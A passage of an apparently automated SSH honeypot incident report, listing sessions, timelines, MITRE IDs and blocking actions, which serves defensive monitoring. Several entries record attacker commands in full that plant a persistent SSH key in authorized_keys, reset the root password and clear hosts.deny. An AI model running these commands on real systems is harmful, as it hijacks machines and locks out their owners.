|---|---|
| `2026-05-21 20:49:54` | `cowrie.session.connect` |
| `2026-05-21 20:49:54` | `cowrie.client.version` |
| `2026-05-21 20:49:54` | `cowrie.client.kex` |
| `2026-05-21 20:49:55` | `cowrie.login.success` |
| `2026-05-21 20:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60dc4815c6ea

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:54 |
| **Last Seen** | 2026-05-21 20:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:54:18` | `cowrie.session.connect` |
| `2026-05-21 20:54:18` | `cowrie.client.version` |
| `2026-05-21 20:54:18` | `cowrie.client.kex` |
| `2026-05-21 20:54:19` | `cowrie.login.success` |
| `2026-05-21 20:54:20` | `cowrie.session.params` |
| `2026-05-21 20:54:20` | `cowrie.command.input` |
| `2026-05-21 20:54:20` | `cowrie.command.failed` |
| `2026-05-21 20:54:20` | `cowrie.log.closed` |
| `2026-05-21 20:54:20` | `cowrie.session.params` |
| `2026-05-21 20:54:20` | `cowrie.command.input` |
| `2026-05-21 20:54:21` | `cowrie.session.file_download` |
| `2026-05-21 20:54:21` | `cowrie.log.closed` |
| `2026-05-21 20:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99321f06e2f5

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:54 |
| **Last Seen** | 2026-05-21 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:54:23` | `cowrie.session.connect` |
| `2026-05-21 20:54:23` | `cowrie.client.version` |
| `2026-05-21 20:54:23` | `cowrie.client.kex` |
| `2026-05-21 20:54:24` | `cowrie.login.success` |
| `2026-05-21 20:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3484442ec13

| Field | Detail |
|---|---|
| **Source IP** | `101.126.154[.]252` |
| **First Seen** | 2026-05-21 20:57 |
| **Last Seen** | 2026-05-21 21:02 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:57:22` | `cowrie.session.connect` |
| `2026-05-21 20:57:22` | `cowrie.client.version` |
| `2026-05-21 20:57:22` | `cowrie.client.kex` |
| `2026-05-21 20:57:25` | `cowrie.login.success` |
| `2026-05-21 20:57:26` | `cowrie.session.params` |
| `2026-05-21 20:57:26` | `cowrie.command.input` |
| `2026-05-21 20:57:26` | `cowrie.command.failed` |
| `2026-05-21 20:57:26` | `cowrie.log.closed` |
| `2026-05-21 20:57:29` | `cowrie.session.params` |
| `2026-05-21 20:57:29` | `cowrie.command.input` |
| `2026-05-21 21:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.154[.]252` to AbuseIPDB if not already reported
- [ ] Block `101.126.154[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549fc9e9f9bf

| Field | Detail |
|---|---|
| **Source IP** | `172.191.132[.]202` |
| **First Seen** | 2026-05-21 21:05 |
| **Last Seen** | 2026-05-21 21:06 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rco0V2zTPGL6"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:05:47` | `cowrie.session.connect` |
| `2026-05-21 21:05:47` | `cowrie.client.version` |
| `2026-05-21 21:05:47` | `cowrie.client.kex` |
| `2026-05-21 21:05:48` | `cowrie.login.success` |
| `2026-05-21 21:05:49` | `cowrie.session.params` |
| `2026-05-21 21:05:49` | `cowrie.command.input` |
| `2026-05-21 21:05:49` | `cowrie.command.failed` |
| `2026-05-21 21:05:49` | `cowrie.log.closed` |
| `2026-05-21 21:05:50` | `cowrie.session.params` |
| `2026-05-21 21:05:50` | `cowrie.command.input` |
| `2026-05-21 21:05:50` | `cowrie.session.file_download` |
| `2026-05-21 21:05:50` | `cowrie.log.closed` |
| `2026-05-21 21:06:18` | `cowrie.session.params` |
| `2026-05-21 21:06:18` | `cowrie.command.input` |
| `2026-05-21 21:06:18` | `cowrie.log.closed` |
| `2026-05-21 21:06:19` | `cowrie.session.params` |
| `2026-05-21 21:06:19` | `cowrie.command.input` |
| `2026-05-21 21:06:19` | `cowrie.log.closed` |
| `2026-05-21 21:06:19` | `cowrie.session.params` |
| `2026-05-21 21:06:19` | `cowrie.command.input` |
| `2026-05-21 21:06:20` | `cowrie.session.file_download` |
| `2026-05-21 21:06:20` | `cowrie.log.closed` |
| `2026-05-21 21:06:20` | `cowrie.session.params` |
| `2026-05-21 21:06:20` | `cowrie.command.input` |
| `2026-05-21 21:06:20` | `cowrie.log.closed` |
| `2026-05-21 21:06:21` | `cowrie.session.params` |
| `2026-05-21 21:06:21` | `cowrie.command.input` |
| `2026-05-21 21:06:21` | `cowrie.log.closed` |
| `2026-05-21 21:06:21` | `cowrie.session.params` |
| `2026-05-21 21:06:21` | `cowrie.command.input` |
| `2026-05-21 21:06:21` | `cowrie.command.input` |
| `2026-05-21 21:06:22` | `cowrie.log.closed` |
| `2026-05-21 21:06:22` | `cowrie.session.params` |
| `2026-05-21 21:06:22` | `cowrie.command.input` |
| `2026-05-21 21:06:22` | `cowrie.log.closed` |
| `2026-05-21 21:06:23` | `cowrie.session.params` |
| `2026-05-21 21:06:23` | `cowrie.command.input` |
| `2026-05-21 21:06:23` | `cowrie.log.closed` |
| `2026-05-21 21:06:23` | `cowrie.session.params` |
| `2026-05-21 21:06:23` | `cowrie.command.input` |
| `2026-05-21 21:06:24` | `cowrie.log.closed` |
| `2026-05-21 21:06:24` | `cowrie.session.params` |
| `2026-05-21 21:06:24` | `cowrie.command.input` |
| `2026-05-21 21:06:25` | `cowrie.log.closed` |
| `2026-05-21 21:06:25` | `cowrie.session.params` |
| `2026-05-21 21:06:25` | `cowrie.command.input` |
| `2026-05-21 21:06:25` | `cowrie.log.closed` |
| `2026-05-21 21:06:25` | `cowrie.session.params` |
| `2026-05-21 21:06:25` | `cowrie.command.input` |
| `2026-05-21 21:06:26` | `cowrie.log.closed` |
| `2026-05-21 21:06:26` | `cowrie.session.params` |
| `2026-05-21 21:06:26` | `cowrie.command.input` |
| `2026-05-21 21:06:27` | `cowrie.log.closed` |
| `2026-05-21 21:06:27` | `cowrie.session.params` |
| `2026-05-21 21:06:27` | `cowrie.command.input` |
| `2026-05-21 21:06:27` | `cowrie.log.closed` |
| `2026-05-21 21:06:28` | `cowrie.session.params` |
| `2026-05-21 21:06:28` | `cowrie.command.input` |
| `2026-05-21 21:06:28` | `cowrie.log.closed` |
| `2026-05-21 21:06:28` | `cowrie.session.params` |
| `2026-05-21 21:06:28` | `cowrie.command.input` |
| `2026-05-21 21:06:28` | `cowrie.log.closed` |
| `2026-05-21 21:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.132[.]202` to AbuseIPDB if not already reported
- [ ] Block `172.191.132[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f91da7ea487

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:06 |
| **Last Seen** | 2026-05-21 21:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:06:12` | `cowrie.session.connect` |
| `2026-05-21 21:06:12` | `cowrie.client.version` |
| `2026-05-21 21:06:12` | `cowrie.client.kex` |
| `2026-05-21 21:06:12` | `cowrie.login.success` |
| `2026-05-21 21:06:12` | `cowrie.session.params` |
| `2026-05-21 21:06:12` | `cowrie.command.input` |
| `2026-05-21 21:06:12` | `cowrie.command.failed` |
| `2026-05-21 21:06:12` | `cowrie.log.closed` |
| `2026-05-21 21:06:12` | `cowrie.session.params` |
| `2026-05-21 21:06:12` | `cowrie.command.input` |
| `2026-05-21 21:06:12` | `cowrie.session.file_download` |
| `2026-05-21 21:06:12` | `cowrie.log.closed` |
| `2026-05-21 21:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235896b6544d

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:06 |
| **Last Seen** | 2026-05-21 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:06:14` | `cowrie.session.connect` |
| `2026-05-21 21:06:14` | `cowrie.client.version` |
| `2026-05-21 21:06:14` | `cowrie.client.kex` |
| `2026-05-21 21:06:14` | `cowrie.login.success` |
| `2026-05-21 21:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4221602a0df

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:26 |
| **Last Seen** | 2026-05-21 21:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:26:44` | `cowrie.session.connect` |
| `2026-05-21 21:26:44` | `cowrie.client.version` |
| `2026-05-21 21:26:44` | `cowrie.client.kex` |
| `2026-05-21 21:26:45` | `cowrie.login.success` |
| `2026-05-21 21:26:45` | `cowrie.session.params` |
| `2026-05-21 21:26:45` | `cowrie.command.input` |
| `2026-05-21 21:26:45` | `cowrie.command.failed` |
| `2026-05-21 21:26:45` | `cowrie.log.closed` |
| `2026-05-21 21:26:45` | `cowrie.session.params` |
| `2026-05-21 21:26:45` | `cowrie.command.input` |
| `2026-05-21 21:26:45` | `cowrie.session.file_download` |
| `2026-05-21 21:26:45` | `cowrie.log.closed` |
| `2026-05-21 21:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5dd7be4d23d

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:26 |
| **Last Seen** | 2026-05-21 21:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:26:46` | `cowrie.session.connect` |
| `2026-05-21 21:26:46` | `cowrie.client.version` |
| `2026-05-21 21:26:47` | `cowrie.client.kex` |
| `2026-05-21 21:26:47` | `cowrie.login.success` |
| `2026-05-21 21:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c72f063818

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:30 |
| **Last Seen** | 2026-05-21 21:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:30:52` | `cowrie.session.connect` |
| `2026-05-21 21:30:52` | `cowrie.client.version` |
| `2026-05-21 21:30:52` | `cowrie.client.kex` |
| `2026-05-21 21:30:52` | `cowrie.login.success` |
| `2026-05-21 21:30:52` | `cowrie.session.params` |
| `2026-05-21 21:30:52` | `cowrie.command.input` |
| `2026-05-21 21:30:52` | `cowrie.command.failed` |
| `2026-05-21 21:30:52` | `cowrie.log.closed` |
| `2026-05-21 21:30:52` | `cowrie.session.params` |
| `2026-05-21 21:30:52` | `cowrie.command.input` |
| `2026-05-21 21:30:52` | `cowrie.session.file_download` |
| `2026-05-21 21:30:52` | `cowrie.log.closed` |
| `2026-05-21 21:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3c926bf203

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:30 |
| **Last Seen** | 2026-05-21 21:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:30:54` | `cowrie.session.connect` |
| `2026-05-21 21:30:54` | `cowrie.client.version` |
| `2026-05-21 21:30:54` | `cowrie.client.kex` |
| `2026-05-21 21:30:54` | `cowrie.login.success` |
| `2026-05-21 21:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89d563bb2a4d

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:35 |
| **Last Seen** | 2026-05-21 21:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:35:01` | `cowrie.session.connect` |
| `2026-05-21 21:35:01` | `cowrie.client.version` |
| `2026-05-21 21:35:01` | `cowrie.client.kex` |
| `2026-05-21 21:35:01` | `cowrie.login.success` |
| `2026-05-21 21:35:01` | `cowrie.session.params` |
| `2026-05-21 21:35:01` | `cowrie.command.input` |
| `2026-05-21 21:35:01` | `cowrie.command.failed` |
| `2026-05-21 21:35:02` | `cowrie.log.closed` |
| `2026-05-21 21:35:02` | `cowrie.session.params` |
| `2026-05-21 21:35:02` | `cowrie.command.input` |
| `2026-05-21 21:35:02` | `cowrie.session.file_download` |
| `2026-05-21 21:35:02` | `cowrie.log.closed` |
| `2026-05-21 21:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf18b8fc82f

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:35 |
| **Last Seen** | 2026-05-21 21:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:35:03` | `cowrie.session.connect` |
| `2026-05-21 21:35:03` | `cowrie.client.version` |
| `2026-05-21 21:35:03` | `cowrie.client.kex` |
| `2026-05-21 21:35:04` | `cowrie.login.success` |
| `2026-05-21 21:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec0ad532da8

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:39 |
| **Last Seen** | 2026-05-21 21:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:39:13` | `cowrie.session.connect` |
| `2026-05-21 21:39:13` | `cowrie.client.version` |
| `2026-05-21 21:39:13` | `cowrie.client.kex` |
| `2026-05-21 21:39:13` | `cowrie.login.success` |
| `2026-05-21 21:39:13` | `cowrie.session.params` |
| `2026-05-21 21:39:13` | `cowrie.command.input` |
| `2026-05-21 21:39:13` | `cowrie.command.failed` |
| `2026-05-21 21:39:13` | `cowrie.log.closed` |
| `2026-05-21 21:39:13` | `cowrie.session.params` |
| `2026-05-21 21:39:13` | `cowrie.command.input` |
| `2026-05-21 21:39:13` | `cowrie.session.file_download` |
| `2026-05-21 21:39:13` | `cowrie.log.closed` |
| `2026-05-21 21:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c2c2f93d39

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]214` |
| **First Seen** | 2026-05-21 21:39 |
| **Last Seen** | 2026-05-21 21:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 21:39:15` | `cowrie.session.connect` |
| `2026-05-21 21:39:15` | `cowrie.client.version` |
| `2026-05-21 21:39:15` | `cowrie.client.kex` |
| `2026-05-21 21:39:15` | `cowrie.login.success` |
| `2026-05-21 21:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]214` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

